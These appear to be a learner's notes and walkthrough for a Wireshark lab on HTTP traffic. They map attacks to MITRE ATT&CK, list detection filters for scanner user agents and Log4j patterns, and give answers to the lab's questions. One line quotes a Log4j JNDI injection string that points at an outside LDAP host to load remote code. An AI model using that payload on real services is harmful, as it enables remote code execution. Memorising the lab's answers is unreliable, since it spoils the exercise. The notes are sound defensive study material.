**HTTP Analysis** 

- HTTP (Hypertext Transfer Protocol) is a cleartext-based, request-response and client-server protocol.  
- Standard type of network activity for request/serve webpages.  
- Attack Vectors: 
	1. Phishing pages 
		- T1589: Reconnaissance ([Gather Victim Identity Information, Technique T1589 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1589/))
			- Tactic: Gather Victim Identity Information
				- Adversaries gather email addresses or employee names to target phishing campaigns. 
		- T1584: Resource Development ([Compromise Infrastructure, Technique T1584 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1584/))
			- Tactic: Acquire Infrastructure Domains
				- Adversaries may registering deceptive domains (typosquatting) to host the phishing page.
	2. Web Attacks
		- T1190: Initial Access ([Exploit Public-Facing Application, Technique T1190 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1190/))
			- Tactic: Exploit Public-Facing Application
				- Adversaries will be motivated to leverage vulnerabilities in web servers or application to gain access
		-  T1505.003: Persistence ([Server Software Component: Web Shell, Sub-technique T1505.003 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1505/003/))
			- Tactic: Server Software Component: Web 
				- Adversaries may deploy scripts (PHP, ASPX, JSP) on a web server to maintain persistent remote access
	3. Data Exfiltration
		- T1041: Exfiltration ([Exfiltration Over C2 Channel, Technique T1041 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1041/))
			- Tactic: Exfiltration Over C2 Channel
				- Adversaries leveraging the existing HTTP/S command and control (C2) channel to steal data and blending it with C2 network traffic.
		- T1071.001: Command and Control ([Application Layer Protocol, Technique T1071 - Enterprise | MITRE ATT&CK®](https://attack.mitre.org/techniques/T1071/))
			- Tactic: Application Layer Protocol: Web Protocol 
				- Adversaries can utilize HTTP, HTTPS, or HTTP/2/3 to communicate with external servers, making exfiltration appear as standard web browsing.  

**HTTP analysis:** 

|   |   |
|---|---|
|Notes|Wireshark Filter|
|Global search <br><br>Note: HTTP2 is a revision of the HTTP protocol for better performance and security. It supports binary data transfer and request&response multiplexing.|- http <br>    <br><br>- http2|
|"HTTP Request Methods" for grabbing the low-hanging fruits: <br><br>- GET <br>    <br><br>- POST <br>    <br><br>- Request: Listing all requests|- http.request.method == "GET" <br>    <br><br>- http.request.method == "POST" <br>    <br><br>- http.request|
|"HTTP Response Status Codes" for grabbing the low-hanging fruits: <br><br>- 200 OK: Request successful. <br>    <br><br>- 301 Moved Permanently: Resource is moved to a new URL/path (permanently). <br>    <br><br>- 302 Moved Temporarily: Resource is moved to a new URL/path (temporarily). <br>    <br><br>- 400 Bad Request: Server didn't understand the request. <br>    <br><br>- 401 Unauthorised: URL needs authorisation (login, etc.). <br>    <br><br>- 403 Forbidden: No access to the requested URL.  <br>    <br><br>- 404 Not Found: Server can't find the requested URL. <br>    <br><br>- 405 Method Not Allowed: Used method is not suitable or blocked. <br>    <br><br>- 408 Request Timeout:  Request look longer than server wait time. <br>    <br><br>- 500 Internal Server Error: Request not completed, unexpected error. <br>    <br><br>- 503 Service Unavailable: Request not completed server or service is down.|- http.response.code == 200 <br>    <br><br>- http.response.code == 401 <br>    <br><br>- http.response.code == 403 <br>    <br><br>- http.response.code == 404 <br>    <br><br>- http.response.code == 405 <br>    <br><br>- http.response.code == 503|
|"HTTP Parameters" for grabbing the low-hanging fruits: <br><br>- User agent: Browser and operating system identification to a web server application. <br>    <br><br>- Request URI: Points the requested resource from the server. <br>    <br><br>- Full *URI: Complete URI information. <br>    <br><br>*URI: Uniform Resource Identifier.|- http.user_agent contains "nmap" <br>    <br><br>- http.request.uri contains "admin" <br>    <br><br>- http.request.full_uri contains "admin"|
|"HTTP Parameters" for grabbing the low-hanging fruits: <br><br>- Server: Server service name. <br>    <br><br>- Host: Hostname of the server <br>    <br><br>- Connection: Connection status. <br>    <br><br>- Line-based text data: Cleartext data provided by the server. <br>    <br><br>- HTML Form URL Encoded: Web form information.|- http.server contains "apache" <br>    <br><br>- http.host contains "keyword" <br>    <br><br>- http.host == "keyword" <br>    <br><br>- http.connection == "Keep-Alive" <br>    <br><br>- data-text-lines contains "keyword"|

**User Agent Analysis** 

- When analyzing network traffic in Wireshark, the user-agent field is a great resource for detecting anomalies.  
    

|   |   |
|---|---|
|Notes|Wireshark Filter|
|Global search.|- http.user_agent|
|Research outcomes for grabbing the low-hanging fruits: <br><br>- Different user agent information from the same host in a short time notice. <br>    <br><br>- Non-standard and custom user agent info. <br>    <br><br>- Subtle spelling differences. ("Mozilla" is not the same as  "Mozlilla" or "Mozlila") <br>    <br><br>- Audit tools info like Nmap, Nikto, Wfuzz and sqlmap in the user agent field. <br>    <br><br>- Payload data in the user agent field.|- (http.user_agent contains "sqlmap") or (http.user_agent contains "Nmap") or (http.user_agent contains "Wfuzz") or (http.user_agent contains "Nikto")|

**Log4j Analysis** 

|                                                                                                                                                                                                 |                                                                                                                                                                                                                                                                 |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Notes                                                                                                                                                                                           | Wireshark Filters                                                                                                                                                                                                                                               |
| Research outcomes for grabbing the low-hanging fruits: <br><br>- The attack starts with a "POST" request <br>    <br><br>- There are known cleartext patterns: "jndi:ldap" and "Exploit.class". | - http.request.method == "POST" <br>    <br><br>- (ip contains "jndi") or ( ip contains "Exploit") <br>    <br><br>- (frame contains "jndi") or ( frame contains "Exploit") <br>    <br><br>- (http.user_agent contains "$") or (http.user_agent contains "==") |

1. **Investigate the user agents. What is the number of anomalous “user-agent” types?** 
- To determine the number of user agents in the traffic, we can use the filter *http.user_agent* <--- this will filter out the user_agents only. 
- Next, we need to manually go through the packets to determine how many user agents there are in total. 
    ![[87.png]] 

Answer: 6  

-  Mozilla/5.0 (x=X11; Ubuntu; Linux) 
-  Mozilla/5.0 (WIndows; U; WIndows NT 6.4; en US) 
-  Wfuzz/2.4\r\n 
-  Sqlmap /1,4#stable (http://sqlmap.org)\r\n 
-  Mozilla/5.0 (compatible; nmap Scripting Engine) 
- ${jndi : ldap: //45.137.21.9:1389/Basic/Command} 
    
2. **What is the packet number with a subtle spelling difference in the user agent field?**  
- This requires us to comb through the packets to identify the spelling difference.  
    ![[88.png]]

3. **Locate the “Log4j” attack starting phase. What is the packet number?**
- Attacks from adversary usually starts with a POST  
- We could use the filter *“http.request.method == POST*”, however that will most likely generate a lot of POST traffic 
- Instead of using the POST filter we can use a user_agent filter such as * $ * or *http.user_agent contains “== “* <--- this is filter for traffic with user agent that contains the dollar sign “$” which signals for command injections or double equal sign “ == ” which are typically at the end of a based64 encoded string.  
    ![[89.png]]

4. Locate the Log4j attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Defang the IP Address)
- Since we already identified the starting point in question 3, we just must decode the base64 encoded characters.  
-  We can use cyberchef or copy the base64 and save it as a file and use the ubuntu terminal to decode the base64 and save the file.  
	![[90.png]]
	Answer: 62[.]210[.]130[.]250